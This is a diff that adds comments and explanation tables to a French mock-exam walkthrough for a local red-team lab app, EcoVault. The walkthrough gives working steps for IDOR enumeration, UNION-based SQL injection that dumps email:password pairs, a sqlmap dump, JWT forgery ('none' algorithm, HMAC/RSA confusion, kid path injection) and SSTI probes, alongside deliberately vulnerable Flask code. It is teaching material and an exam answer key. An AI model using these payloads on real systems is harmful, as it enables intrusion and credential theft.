@@ -2,7 +2,11 @@
 
 **Niveau** : M2 (Red Team) — Examen Blanc  
 **Durée** : 45 minutes (chrono)  
-**Lab** : `http://ecovault.local` (ou `http://localhost:8080`)  
+**Lab** : `http://ecovault.local` (ou `http://localhost:8080`)
+```bash
+# Ajouter à /etc/hosts pour résoudre ecovault.local :
+echo "127.0.0.1 ecovault.local" | sudo tee -a /etc/hosts
+```
 **Compte fourni** : `user@ecovault.com` / `User2026!`  
 **Type de test** : Boîte grise  
 **Tags MITRE ATT&CK** : T1548, T1190, T1078, T1059.003, T1021
@@ -173,29 +177,56 @@ user@ecovault.com
 **Étape 1 — Se connecter à l'application**
 
 ```bash
+# -c : écrit les cookies reçus dans le fichier (nécessaire pour conserver le JWT)
+# -X POST : utilise la méthode HTTP POST pour soumettre le formulaire de login
+# -d : envoie les données du formulaire (email et mot de passe du compte fourni)
+# -L : suit automatiquement les redirections (le serveur redirige après login réussi)
 curl -c /tmp/flag1_cookies.txt -X POST http://ecovault.local/login \
   -d "email=user@ecovault.com&password=User2026!" -L
 ```
 
-**Explication :**
-- `-c /tmp/flag1_cookies.txt` : sauvegarde les cookies (dont le JWT) dans un fichier
-- `-X POST` : méthode HTTP POST
-- `-d` : données du formulaire (email + password)
-- `-L` : suit les redirections HTTP (le serveur redirige souvent après login)
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl` | Outil CLI de transfert de données supportant de nombreux protocoles (HTTP, FTP, etc.) |
+| `-c /tmp/flag1_cookies.txt` | Cookie jar : écrit les cookies reçus (dont le JWT) dans le fichier spécifié |
+| `-X POST` | Force la méthode HTTP POST pour envoyer le formulaire d'authentification |
+| `http://ecovault.local/login` | URL du endpoint d'authentification de l'application EcoVault |
+| `-d "email=...&password=..."` | Données du formulaire URL-encodées contenant les identifiants fournis |
+| `-L` | Suit les redirections HTTP 3xx (le serveur redirige vers /dashboard après login) |
 
 On obtient un cookie de session qui contient un JWT. Vérifions :
 
 ```bash
+# Affiche le contenu du fichier de cookies pour vérifier que le JWT a bien été stocké
 cat /tmp/flag1_cookies.txt
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `cat` | Affiche le contenu d'un fichier dans le terminal |
+| `/tmp/flag1_cookies.txt` | Fichier contenant les cookies HTTP (dont le JWT d'authentification) |
 
 **Étape 2 — Lire son propre profil**
 
 L'utilisateur `user@ecovault.com` a l'ID 2 (l'admin a l'ID 1).
 
 ```bash
+# -b : utilise le fichier de cookies pour envoyer le JWT dans la requête
+# L'ID 2 correspond à l'utilisateur standard user@ecovault.com
 curl -b /tmp/flag1_cookies.txt http://ecovault.local/api/profile/2
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl` | Outil CLI de transfert de données |
+| `-b /tmp/flag1_cookies.txt` | Envoie les cookies du fichier dans la requête HTTP (authentification JWT) |
+| `http://ecovault.local/api/profile/2` | Endpoint API qui retourne le profil utilisateur ; `2` est l'ID de l'utilisateur standard |
 
 **Réponse attendue :**
 
@@ -214,8 +245,18 @@ curl -b /tmp/flag1_cookies.txt http://ecovault.local/api/profile/2
 On change simplement l'ID de `2` à `1` :
 
 ```bash
+# Exploitation IDOR : on change simplement l'ID de 2 à 1 pour cibler l'administrateur
+# Le serveur ne vérifie PAS que l'ID demandé correspond à l'utilisateur connecté
 curl -b /tmp/flag1_cookies.txt http://ecovault.local/api/profile/1
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl` | Outil CLI de transfert de données |
+| `-b /tmp/flag1_cookies.txt` | Envoie le cookie JWT de session (authentification en tant que user) |
+| `http://ecovault.local/api/profile/1` | Endpoint vulnérable ; l'ID `1` est celui de l'administrateur — aucune vérification d'appartenance |
 
 **Réponse attendue (Flag 1) :**
 
@@ -236,22 +277,44 @@ curl -b /tmp/flag1_cookies.txt http://ecovault.local/api/profile/1
 Le endpoint `/api/profile/{id}` dans le code de l'application ressemble à ceci :
 
 ```python
+# ⚠️ Code vulnérable : endpoint qui retourne le profil sans contrôle d'appartenance
 @app.route('/api/profile/<int:user_id>')
 def api_profile(user_id):
+    # Faille 1 : user_id (paramètre URL) n'est JAMAIS comparé à l'ID du JWT
+    # Faille 2 : concaténation directe dans la requête SQL (vulnérabilité SQLi)
     user = query_db(f"SELECT * FROM users WHERE id={user_id}", one=True)
     if user:
-        return jsonify(user)
+        return jsonify(user)       # Retourne toutes les colonnes (y compris api_key)
     return jsonify({'error': 'Not found'}), 404
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `@app.route(...)` | Décorateur Flask qui associe une URL à une fonction |
+| `<int:user_id>` | Paramètre d'URL typé (entier) capturé depuis le chemin |
+| `query_db(...)` | Fonction interne qui exécute une requête SQL et retourne les résultats |
+| `f"SELECT ... {user_id}"` | **F-string** : concaténation directe de l'utilisateur dans la requête (SQLi) |
+| `jsonify(user)` | Convertit le dictionnaire Python en réponse JSON |
 
 **Deux failles distinctes :**
 
 1. **Absence de vérification d'appartenance** : le code ne compare pas `user_id` (paramètre de l'URL) avec l'ID extrait du JWT de l'utilisateur connecté. Il devrait y avoir un test du type :
 
    ```python
+   # ✅ Vérification d'appartenance qui DEVRAIT être présente
+   # Compare l'ID de l'URL (user_id) avec l'ID extrait du JWT (current_user.id)
    if user_id != current_user.id:
-       return jsonify({'error': 'Unauthorized'}), 403
+       return jsonify({'error': 'Unauthorized'}), 403  # 403 = Forbidden
    ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `if user_id != current_user.id` | Compare l'ID demandé dans l'URL avec l'ID de l'utilisateur authentifié (via JWT) |
+| `return jsonify({'error': 'Unauthorized'}), 403` | Retourne une erreur HTTP 403 Forbidden si les IDs ne correspondent pas |
 
 2. **Requête SQL non paramétrée** : la chaîne SQL est construite par concaténation (`f-string`), ce qui rend le endpoint également vulnérable à l'injection SQL (Flag 2).
 
@@ -268,18 +331,36 @@ Avec **Burp Suite** :
 Avec **Python** (script d'énumération) :
 
 ```python
+#!/usr/bin/env python3
+"""
+Script d'énumération IDOR — Teste les IDs 1 à 10 sur /api/profile/{id}
+Automatise la détection des profils accessibles sans autorisation
+"""
 import requests
 
 BASE = "http://ecovault.local"
-s = requests.Session()
-s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})
+s = requests.Session()                                      # Crée une session persistante (conserve les cookies)
+s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})  # Authentification initiale
 
-for uid in range(1, 11):
-    r = s.get(f"{BASE}/api/profile/{uid}")
-    if r.status_code == 200:
+for uid in range(1, 11):                                    # Boucle sur les IDs 1 à 10
+    r = s.get(f"{BASE}/api/profile/{uid}")                  # Requête GET avec l'ID en paramètre
+    if r.status_code == 200:                                 # Si la réponse est 200 OK, le profil est accessible
         data = r.json()
         print(f"[+] ID {uid}: {data.get('email')} — role={data.get('role')} — key={data.get('api_key')}")
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `import requests` | Importe la bibliothèque Python pour les requêtes HTTP |
+| `requests.Session()` | Crée une session qui conserve les cookies entre les requêtes (comme un navigateur) |
+| `s.post(url, data=...)` | Envoie une requête POST avec les données du formulaire d'authentification |
+| `for uid in range(1, 11)` | Itère sur les IDs utilisateur de 1 à 10 pour énumérer les profils |
+| `s.get(url)` | Envoie une requête GET avec le cookie de session |
+| `r.status_code == 200` | Vérifie si la requête a réussi (code HTTP 200 = OK) |
+| `r.json()` | Parse la réponse JSON en dictionnaire Python |
+| `data.get('api_key')` | Récupère la clé API (non nulle uniquement pour l'admin) |
 
 ---
 
@@ -308,37 +389,90 @@ for uid in range(1, 11):
 **Étape 1 — Détection de l'injection**
 
 ```bash
+# -s : mode silencieux (n'affiche pas la barre de progression)
+# Le paramètre filter reçoit une guillemet simple ' pour "casser" la requête SQL
+# Si le serveur renvoie une erreur SQL ou une réponse vide, il est vulnérable
 curl -s "http://ecovault.local/api/transactions?filter=1'"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl` | Outil CLI pour effectuer des requêtes HTTP |
+| `-s` | Mode silencieux : désactive la barre de progression et les messages d'erreur |
+| `?filter=1'` | Paramètre GET contenant une guillemet simple pour fermer la chaîne SQL et provoquer une erreur de syntaxe |
+| URL complète | Endpoint /api/transactions qui construit la requête SQL par concaténation du paramètre filter |
 
 **Si vulnérable** : une erreur SQL apparaît dans la réponse, ou la réponse est différente (vide, code 500).
 
 ```bash
-# Test time-based (MySQL)
+# time : mesure la durée d'exécution de la commande
+# --max-time 10 : limite le temps d'attente à 10 secondes (évite de bloquer)
+# SLEEP(3) : fonction MySQL qui suspend l'exécution pendant 3 secondes
+# Si la commande prend ~3 secondes, l'injection time-based fonctionne
+# %20 = espace, %27 = ' (URL encoding), -- = commentaire SQL
 time curl -s --max-time 10 "http://ecovault.local/api/transactions?filter=1'%20OR%20SLEEP(3)%20--%20-"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `time` | Commande Linux qui mesure le temps d'exécution de la commande suivante |
+| `--max-time 10` | Limite la requête curl à 10 secondes maximum (timeout) |
+| `filter=1'` | Guillemet simple pour fermer la chaîne SQL existante |
+| `%20OR%20SLEEP(3)` | `OR SLEEP(3)` en URL-encodé : ajoute une condition qui retarde la réponse de 3s si MySQL |
+| `%20--%20-` | Commentaire SQL qui ignore le reste de la requête originale |
+| `time curl ...` | L'ensemble mesure le délai de réponse : ~3s → injection time-based confirmée |
 
 Si la requête prend ~3 secondes, le paramètre `filter` est injectable.
 
 **Étape 2 — Déterminer le nombre de colonnes**
 
 ```bash
-# ORDER BY pour trouver le nombre de colonnes
-curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%201%20--%20-"
-curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%202%20--%20-"
-curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%203%20--%20-"
-curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%204%20--%20-"
-curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%205%20--%20-"
+# ORDER BY N : trie les résultats par la colonne N
+# Technique : on incrémente N jusqu'à obtenir une erreur
+# Le dernier N qui fonctionne = nombre de colonnes dans la table
+# %20 = espace (URL encoding), %20ORDER%20BY%20N%20--%20- = " ORDER BY N -- -"
+curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%201%20--%20-"  # Trie par colonne 1
+curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%202%20--%20-"  # Trie par colonne 2
+curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%203%20--%20-"  # Trie par colonne 3
+curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%204%20--%20-"  # Trie par colonne 4
+curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%205%20--%20-"  # Trie par colonne 5
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `ORDER BY N` | Clause SQL qui trie les résultats par la N-ième colonne ; si N dépasse le nombre réel de colonnes, une erreur est déclenchée |
+| `1'` | Guillemet simple pour fermer la chaîne du filtre et injecter du SQL |
+| `%20` | URL-encoding de l'espace (indispensable dans une URL) |
+| `--%20-` | Commentaire SQL qui ignore le reste de la requête originale (souvent `'` final non fermé) |
+| Requêtes séquentielles | On augmente N jusqu'à ce qu'une requête échoue → le dernier N valide est le nombre de colonnes |
 
 **Logique** : on incrémente le nombre de colonnes jusqu'à obtenir une erreur ou une réponse vide. Le dernier nombre valide est le nombre de colonnes. Exemple : si ORDER BY 5 fonctionne mais ORDER BY 6 échoue, il y a 5 colonnes.
 
 **Étape 3 — Injection UNION SELECT manuelle**
 
 ```bash
-# Identifier les colonnes exploitables
+# -1' : ID négatif pour que la 1ère partie du SELECT ne retourne aucun résultat
+# UNION SELECT 1,2,3,4,5 : fusionne nos valeurs factices avec le résultat
+# Les nombres qui apparaissent dans la réponse sont les colonnes exploitables (affichables)
+# -- - : commentaire SQL pour ignorer la fin de la requête originale
 curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,2,3,4,5--%20-"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `UNION SELECT` | Mot-clé SQL qui fusionne les résultats de deux requêtes SELECT distinctes |
+| `-1'` | ID négatif : garantit que la première requête ne retourne rien (aucun ID négatif dans la table) |
+| `1,2,3,4,5` | Valeurs factices pour chaque colonne ; les numéros qui s'affichent indiquent les positions exploitables |
+| `-- -` | Commentaire SQL : supprime le reste de la requête (souvent un `'` non fermé) |
+| Logique | Si le chiffre `3` apparaît dans la réponse, la 3e colonne est exploitable pour extraire des données |
 
 On met `-1` au lieu de `1` pour que la première partie de la requête ne retourne aucun résultat, ce qui affiche uniquement notre UNION.
 
@@ -347,32 +481,78 @@ Les numéros qui apparaissent dans la réponse sont les colonnes exploitables.
 **Étape 4 — Extraire le nom de la base**
 
 ```bash
+# DATABASE() : fonction MySQL qui retourne le nom de la base de données courante
+# On remplace un des nombres factices (2) par DATABASE() pour l'afficher dans la réponse
 curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,DATABASE(),3,4,5--%20-"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `DATABASE()` | Fonction MySQL qui retourne le nom de la base de données courante |
+| `UNION SELECT 1,DATABASE(),3,4,5` | Remplace la colonne 2 par le nom de la base pour l'afficher dans la réponse |
+| Résultat attendu | Le nom de la base (`ecovault`) apparaît dans la réponse JSON |
 
 **Réponse** : `ecovault`
 
 **Étape 5 — Extraire les tables**
 
 ```bash
+# GROUP_CONCAT(table_name) : concatène tous les noms de tables en une seule chaîne
+# information_schema.tables : vue système MySQL qui liste toutes les tables
+# WHERE table_schema=DATABASE() : filtre uniquement les tables de la base courante
 curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()--%20-"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `GROUP_CONCAT(table_name)` | Fonction d'agrégation MySQL qui concatène les valeurs en une chaîne séparée par des virgules |
+| `information_schema.tables` | Vue système MySQL contenant les métadonnées de toutes les tables de la base |
+| `WHERE table_schema=DATABASE()` | Filtre pour n'obtenir que les tables de la base courante (`ecovault`) |
+| Résultat | Liste des tables : `users,transactions,coupons` |
 
 **Réponse** : `users,transactions,coupons`
 
 **Étape 6 — Extraire les colonnes de la table `users`**
 
 ```bash
+# GROUP_CONCAT(column_name) : concatène tous les noms de colonnes
+# information_schema.columns : vue système qui liste toutes les colonnes
+# WHERE table_name='users' : filtre sur la table cible
 curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3,4,5%20FROM%20information_schema.columns%20WHERE%20table_name='users'--%20-"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `information_schema.columns` | Vue système MySQL contenant les métadonnées de toutes les colonnes |
+| `WHERE table_name='users'` | Filtre pour n'obtenir que les colonnes de la table `users` |
+| `GROUP_CONCAT(column_name)` | Agrège tous les noms de colonnes en une chaîne unique |
+| Résultat | Colonnes : `id,email,password,role,api_key,created_at` (la colonne `password` contient les hash/mots de passe) |
 
 **Réponse** : `id,email,password,role,api_key,created_at`
 
 **Étape 7 — Extraire les données (Flag 2)**
 
 ```bash
+# GROUP_CONCAT(email,':',password) : concatène email + ':' + password pour chaque ligne
+# Les colonnes 3,4,5 ne sont pas utilisées mais doivent être présentes pour que UNION fonctionne
+# FROM users : extrait les données de la table users complète
 curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,GROUP_CONCAT(email,':',password),3,4,5%20FROM%20users--%20-"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `GROUP_CONCAT(email,':',password)` | Concatène chaque couple email:password séparé par des virgules entre lignes |
+| `FROM users` | Source des données : la table utilisateurs complète |
+| `1, ..., 3,4,5` | Les colonnes non exploitées doivent contenir des valeurs factices pour respecter le nombre de colonnes |
+| Résultat | Liste de tous les comptes utilisateurs avec leurs mots de passe en clair (critique) |
 
 **Réponse attendue (Flag 2) :**
 
@@ -415,8 +595,20 @@ sqlmap -u "http://ecovault.local/api/transactions?filter=1" \
 **Commande rapide pour tout extraire :**
 
 ```bash
+# Version compacte de la commande sqlmap ci-dessus
+# --dump extrait TOUTES les tables de la base, pas seulement users
 sqlmap -u "http://ecovault.local/api/transactions?filter=1" --batch --dbms=mysql --dump
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `sqlmap` | Outil automatisé de détection et d'exploitation d'injections SQL |
+| `-u "..."` | URL cible avec le paramètre à tester en injection |
+| `--batch` | Mode non-interactif (réponses automatiques "oui" par défaut) |
+| `--dbms=mysql` | Force le type de SGBD (accélère l'analyse en évitant les tests inutiles) |
+| `--dump` | Extraction complète de toutes les données de toutes les tables de la base |
 
 #### 4.2.6 Pourquoi ça marche
 
@@ -468,24 +660,52 @@ results = query_db(query, (filter_val,))
 **Étape 1 — Récupérer un JWT légitime**
 
 ```bash
+# Étape 1 : récupérer un JWT valide en se connectant avec le compte fourni
+# -c : stocke les cookies (dont le JWT) dans /tmp/jwt_cookies.txt
 curl -c /tmp/jwt_cookies.txt -X POST http://ecovault.local/login \
   -d "email=user@ecovault.com&password=User2026!" -L
 
-# Extraire le token du cookie
+# Étape 2 : extraire la valeur du JWT depuis le fichier de cookies
+# grep token : cherche la ligne contenant "token"
+# awk '{print $NF}' : affiche la dernière colonne (la valeur du cookie)
 grep token /tmp/jwt_cookies.txt | awk '{print $NF}'
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl -c /tmp/jwt_cookies.txt` | Sauvegarde les cookies HTTP (dont le JWT) dans un fichier |
+| `-X POST -d "email=...&password=..."` | Authentification par formulaire POST avec les identifiants fournis |
+| `-L` | Suit les redirections HTTP après connexion |
+| `grep token /tmp/jwt_cookies.txt` | Filtre la ligne contenant "token" dans le fichier de cookies |
+| `awk '{print $NF}'` | Extrait la dernière colonne (valeur du cookie JWT) de la ligne filtrée |
 
 **Étape 2 — Analyser le JWT**
 
 Utiliser [jwt.io](https://jwt.io) ou la CLI :
 
 ```bash
-# Décoder le header et le payload en base64
+# Décoder le header et le payload du JWT (format base64url)
+# Un JWT est composé de 3 parties séparées par des points : header.payload.signature
 TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJlbWFpbCI6InVzZXJAZWNvdmF1bHQuY29tIiwicm9sZSI6InVzZXIiLCJraWQiOiJrZXkxIn0.SIGNATURE"
 
+# cut -d. -f1 : extrait la 1ère partie (header) avant le point → décodage base64
 echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
+# cut -d. -f2 : extrait la 2ème partie (payload) → décodage base64
 echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `TOKEN="..."` | Variable shell contenant le JWT complet (3 parties séparées par des points) |
+| `cut -d. -f1` | Découpe la chaîne avec `.` comme délimiteur et prend le 1er champ (header) |
+| `cut -d. -f2` | Prend le 2e champ (payload contenant user_id, email, role) |
+| `base64 -d` | Décode du base64 (le JWT utilise du base64url, mais base64 -d fonctionne généralement) |
+| `2>/dev/null` | Redirige les erreurs (padding warnings) vers /dev/null pour un affichage propre |
+| `; echo` | Ajoute un saut de ligne après le décodage (base64 -d n'ajoute pas de newline) |
 
 **Résultat :**
 
@@ -504,8 +724,18 @@ Notre objectif : modifier le payload pour obtenir `"role":"admin"` et `"user_id"
 Le lab expose un endpoint qui fournit la configuration JWT :
 
 ```bash
+# Requête GET vers l'endpoint qui expose la configuration JWT
+# Retourne la clé publique RSA et l'algorithme utilisé (RS256)
+# Cette information est critique pour l'attaque HMAC/RSA confusion
 curl http://ecovault.local/api/jwt-info
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl` | Outil CLI pour requêtes HTTP |
+| `http://ecovault.local/api/jwt-info` | Endpoint qui expose la configuration JWT : clé publique + algorithme (vulnérabilité : ces infos permettent de forger des tokens) |
 
 **Réponse :**
 
@@ -522,6 +752,7 @@ curl http://ecovault.local/api/jwt-info
 **Méthode A : None Algorithm**
 
 ```python
+# Sauvegarder ce script sous forge_jwt_none.py :
 #!/usr/bin/env python3
 """
 forge_jwt_none.py — Forge un JWT avec l'algorithme 'none'
@@ -539,12 +770,21 @@ print(f"Token forgé (none):\n{token}")
 ```
 
 ```bash
+# Exécute le script Python pour générer le token JWT avec algorithme 'none'
 python3 forge_jwt_none.py
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `python3` | Interpréteur Python 3 qui exécute le script de forge |
+| `forge_jwt_none.py` | Script qui génère un JWT avec `alg: none` et rôle admin |
 
 **Méthode B : HMAC/RSA Confusion (recommandée)**
 
 ```python
+# Sauvegarder ce script sous forge_jwt_confusion.py :
 #!/usr/bin/env python3
 """
 forge_jwt_confusion.py — HMAC/RSA confusion attack
@@ -562,12 +802,21 @@ print(f"Token forgé (HMAC/RSA confusion):\n{token}")
 ```
 
 ```bash
+# Exécute le script pour générer un token JWT par confusion HMAC/RSA
 python3 forge_jwt_confusion.py
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `python3` | Interpréteur Python 3 |
+| `forge_jwt_confusion.py` | Script qui forge un token en exploitant la confusion entre HMAC et RSA |
 
 **Méthode C : Kid Injection**
 
 ```python
+# Sauvegarder ce script sous forge_jwt_kid.py :
 #!/usr/bin/env python3
 """
 forge_jwt_kid.py — Kid injection avec /dev/null
@@ -580,17 +829,39 @@ print(f"Token forgé (kid injection):\n{token}")
 ```
 
 ```bash
+# Exécute le script pour générer un JWT avec injection kid
 python3 forge_jwt_kid.py
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `python3` | Interpréteur Python 3 |
+| `forge_jwt_kid.py` | Script qui forge un token en exploitant l'injection du paramètre `kid` |
 
 **Étape 5 — Tester le token forgé**
 
 ```bash
+# Stocke le token forgé (ici avec alg:none) dans une variable
 TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9."
 
+# Teste le token forgé sur l'endpoint admin
+# -b "token=$TOKEN" : envoie le token JWT comme cookie
+# | jq . : formate la réponse JSON pour une meilleure lisibilité
 curl -X GET http://ecovault.local/admin/debug \
   -b "token=$TOKEN" | jq .
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `TOKEN="..."` | Variable contenant le JWT forgé (header.payload.signature) |
+| `curl -X GET` | Requête HTTP GET vers l'endpoint admin |
+| `-b "token=$TOKEN"` | Envoie le JWT forgé comme cookie HTTP nommé `token` |
+| `\| jq .` | Pipe vers `jq` : formateur/coloriseur JSON pour une lecture humaine |
+| `http://ecovault.local/admin/debug` | Endpoint réservé aux admins qui retourne les infos de debug + le flag |
 
 **Réponse attendue (Flag 3) :**
 
@@ -607,20 +878,40 @@ curl -X GET http://ecovault.local/admin/debug \
 **Étape 6 — Vérifier l'accès à l'interface admin**
 
 ```bash
-# Accéder à l'endpoint SSTI admin (prérequis pour le Flag 4)
+# Vérifie que le token admin forgé donne accès à l'interface d'administration
+# L'endpoint /admin/templates est protégé par le rôle 'admin'
+# Si la réponse n'est pas 403, le contournement JWT a fonctionné
 curl -X GET http://ecovault.local/admin/templates \
   -b "token=$TOKEN"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl -X GET` | Requête HTTP GET pour vérifier l'accès à l'interface admin |
+| `-b "token=$TOKEN"` | Envoie le JWT forgé comme cookie d'authentification |
+| `/admin/templates` | Endpoint d'administration vulnérable à la SSTI (Flag 4) — nécessite le rôle admin |
 
 #### 4.3.5 Pourquoi ça marche
 
 **None Algorithm :** Le serveur accepte les tokens avec `"alg": "none"` et désactive la vérification de signature. La bibliothèque JWT mal configurée fait confiance au header.
 
 ```python
-# Code vulnérable
+# ⚠️ Code vulnérable — Accepte l'algorithme 'none' et désactive la vérification de signature
+# jwt.get_unverified_header() : lit le header SANS vérifier la signature (dangereux)
+# options={"verify_signature": False} : désactive la vérification → n'importe quel token est accepté
 if header.get('alg') == 'none':
     return jwt.decode(token, options={"verify_signature": False})
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `header.get('alg')` | Récupère l'algorithme depuis le header JWT (contrôlé par l'attaquant) |
+| `== 'none'` | Si l'algorithme est `'none'`, le serveur désactive la vérification de signature |
+| `options={"verify_signature": False}` | **Faille** : désactive la vérification cryptographique — le JWT est accepté sans signature valide |
 
 **HMAC/RSA Confusion :** Le serveur expose sa clé publique (nécessaire pour vérifier les signatures RSA). L'attaquant utilise cette même clé publique comme secret HMAC. Puisque le serveur accepte à la fois `RS256` et `HS256`, il vérifie le token avec la clé publique en mode HMAC → la signature est valide.
 
@@ -629,20 +920,37 @@ if header.get('alg') == 'none':
 #### 4.3.6 Alternative avec jwt_tool
 
 ```bash
-# Installation
-git clone https://github.com/ticarpi/jwt_tool.git
-cd jwt_tool
-pip3 install -r requirements.txt
+# Installation de jwt_tool depuis GitHub
+git clone https://github.com/ticarpi/jwt_tool.git  # Clone le dépôt officiel de l'outil
+cd jwt_tool                                         # Se place dans le répertoire de l'outil
+pip3 install -r requirements.txt                    # Installe les dépendances Python (requests, pyjwt, etc.)
 
-# Analyse d'un token
-python3 jwt_tool.py $TOKEN
+# Analyse complète d'un token JWT (détection des vulnérabilités)
+python3 jwt_tool.py $TOKEN                          # Analyse le JWT et propose des tests d'attaque
 
-# Test none algorithm
+# Test none algorithm (-X a) : forge un token avec alg=none
+# -I : mode interactif, -pc role : claim à modifier, -pv admin : nouvelle valeur
 python3 jwt_tool.py $TOKEN -X a -I -pc role -pv admin
 
-# Test kid injection
+# Test kid injection (-X k) : exploite le paramètre kid
+# -kc ../../../dev/null : chemin de fichier pour la clé (null byte / null file)
 python3 jwt_tool.py $TOKEN -X k -kc ../../../dev/null
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `git clone` | Clone le dépôt GitHub de l'outil jwt_tool |
+| `cd jwt_tool` | Se déplace dans le répertoire de l'outil |
+| `pip3 install -r requirements.txt` | Installe les dépendances Python nécessaires |
+| `jwt_tool.py $TOKEN` | Analyse le JWT : décode le header/payload et suggère des attaques |
+| `-X a` | Mode d'attaque "none algorithm" |
+| `-I` | Mode interactif (permet de choisir les claims à modifier) |
+| `-pc role` | Spécifie le claim (payload claim) à modifier |
+| `-pv admin` | Nouvelle valeur pour le claim modifié |
+| `-X k` | Mode d'attaque "kid injection" |
+| `-kc ../../../dev/null` | Chemin de fichier pointant vers /dev/null pour la clé |
 
 ---
 
@@ -672,10 +980,24 @@ python3 jwt_tool.py $TOKEN -X k -kc ../../../dev/null
 **Étape 1 — Détection de la SSTI**
 
 ```bash
+# Test SSTI (Server-Side Template Injection) avec une expression mathématique simple
+# {{7*7}} : syntaxe Jinja2 évaluée par le moteur de template côté serveur
+# -s : mode silencieux (désactive la barre de progression)
+# Si la réponse contient "49", la SSTI est confirmée
 curl -s http://ecovault.local/admin/templates \
   -b "token=$TOKEN_ADMIN" \
   -d "template={{7*7}}"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `curl -s` | Requête HTTP silencieuse (sans barre de progression) |
+| `/admin/templates` | Endpoint qui interprète les templates Jinja2 (vulnérable SSTI) |
+| `-b "token=$TOKEN_ADMIN"` | Envoie le JWT admin forgé comme cookie d'authentification |
+| `-d "template={{7*7}}"` | Payload SSTI : expression mathématique 7×7 → doit retourner "49" si le moteur de template est actif |
+| `{{7*7}}` | Syntaxe Jinja2 qui exécute le calcul côté serveur ; "49" dans la réponse confirme la vulnérabilité |
 
 **Résultat attendu si SSTI Jinja2 :** la réponse contient `49` (le calcul a été effectué par le moteur).
 
@@ -683,32 +1005,70 @@ curl -s http://ecovault.local/admin/templates \
 
 ```bash
 # Test spécifique Jinja2 : concaténation de chaîne
+# {{7*'7'}} : en Jinja2, multiplier un entier par une chaîne = concaténation (77)
+# En Twig (PHP), '7' serait converti en entier 7 → résultat 49
+# Ce test permet de distinguer Jinja2 des autres moteurs de template
 curl -s http://ecovault.local/admin/templates \
   -b "token=$TOKEN_ADMIN" \
   -d "template={{7*'7'}}"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `{{7*'7'}}` | Test de comportement : Jinja2 concatène (77), Twig convertit en entier (49) |
